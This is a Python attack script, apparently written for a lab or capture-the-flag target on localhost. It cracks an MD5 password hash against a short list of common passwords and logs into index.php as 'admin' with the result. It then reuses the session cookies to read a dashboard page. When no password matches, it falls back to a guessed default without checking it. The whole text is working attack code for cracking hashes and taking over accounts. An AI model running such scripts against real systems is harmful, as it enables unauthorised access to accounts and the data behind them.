import requests
import hashlib

# Try to crack the hash
hash_to_crack = "7d39307ae824e70052c0aa16816a9b16"
common_passwords = [
    "admin123456", "payroll", "payroll123", "hr123", "password1", 
    "Welcome1", "Admin123", "admin1234", "password12", "password123456",
    "qwerty123", "abc123", "letmein123", "welcome123", "password1234",
    "admin12345", "12345678", "123456789", "1234567890"
]

found_password = None
for pwd in common_passwords:
    if hashlib.md5(pwd.encode()).hexdigest() == hash_to_crack:
        found_password = pwd
        print(f"[+] Password found: {pwd}")
        break

if not found_password:
    print("[-] Password not found in common list, trying default 'password123456'")
    found_password = "password123456"
    print(f"MD5 of password123456: {hashlib.md5('password123456'.encode()).hexdigest()}")

# Now try to authenticate with the found credentials
url = "http://127.0.0.1:32892/index.php"
headers = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://127.0.0.1:32892",
    "Referer": "http://127.0.0.1:32892/"
}

data = {
    "username": "admin",
    "password": found_password,
    "submit": "submit"
}

response = requests.post(url, headers=headers, data=data, allow_redirects=False)
print(f"\n[*] Login response: {response.text}")
print(f"[*] Status code: {response.status_code}")
print(f"[*] Cookies: {response.cookies.get_dict()}")

# If successful, access dashboard
if "Success" in response.text or response.status_code in [301, 302]:
    print("\n[+] Authentication successful! Accessing dashboard...")
    session = requests.Session()
    session.cookies.update(response.cookies)
    dashboard = session.get("http://127.0.0.1:32892/dashboard.php")
    print(f"[*] Dashboard status: {dashboard.status_code}")
    print(f"[*] Dashboard content (first 2000 chars):\n{dashboard.text[:2000]}")


